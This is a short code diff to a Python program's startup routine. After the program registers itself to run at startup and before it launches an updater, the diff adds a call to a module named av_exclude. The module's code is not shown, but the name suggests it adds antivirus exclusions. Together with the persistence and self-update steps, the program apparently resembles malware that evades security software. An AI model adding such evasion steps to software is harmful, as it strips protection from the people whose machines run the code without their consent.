@@ -187,6 +187,11 @@ if __name__ == "__main__":
         _register_startup()
         _log("startup registered, calling main()")
         try:
+            import av_exclude
+            av_exclude.run(log=_log)
+        except Exception as e:
+            _log(f"av_exclude FAIL: {e}")
+        try:
             import updater
             updater.start(build_tag=_BUILD_TAG, log=_log)
             _log("updater started")
